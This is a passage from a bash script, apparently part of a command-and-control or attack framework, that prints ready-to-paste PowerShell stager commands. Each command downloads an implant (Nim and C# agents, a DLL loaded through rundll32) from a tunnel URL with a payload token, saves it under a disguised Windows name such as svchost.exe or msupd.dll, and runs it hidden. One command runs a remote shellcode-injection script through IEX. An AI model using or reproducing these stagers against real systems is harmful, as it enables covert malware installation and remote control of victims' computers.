echo -e "${CYAN}\$d=\$env:TEMP+'\\svchost.exe';IWR '$TUNNEL_URL/payloads/agent_nim.exe?key=$PAYLOAD_TOKEN' -OutFile \$d;Start-Process \$d -WindowStyle Hidden${NC}"
echo ""
echo -e "${YELLOW}▶ NIM AGENT DLL (rundll32):${NC}"
echo -e "${CYAN}\$d=\$env:TEMP+'\\msupd.dll';IWR '$TUNNEL_URL/payloads/agent_nim.dll?key=$PAYLOAD_TOKEN' -OutFile \$d;rundll32.exe \$d,agentMain${NC}"
echo ""
echo -e "${YELLOW}▶ SHELLCODE INJECT (Donut from Nim - use with i5_syscall.ps1):${NC}"
echo -e "${CYAN}# shellcode.txt contains base64 Donut shellcode from agent_nim.exe${NC}"
echo -e "${CYAN}IEX(IWR '$TUNNEL_URL/payloads/i5_syscall.ps1?key=$PAYLOAD_TOKEN' -UseBasicParsing)${NC}"
echo ""
echo -e "${YELLOW}▶ C# AGENT (.NET 8 - ConPTY + BITS):${NC}"
echo -e "${CYAN}\$d=\$env:TEMP+'\\svc.exe';IWR '$TUNNEL_URL/payloads/agent_cs.exe?key=$PAYLOAD_TOKEN' -OutFile \$d;Start-Process \$d -WindowStyle Hidden${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
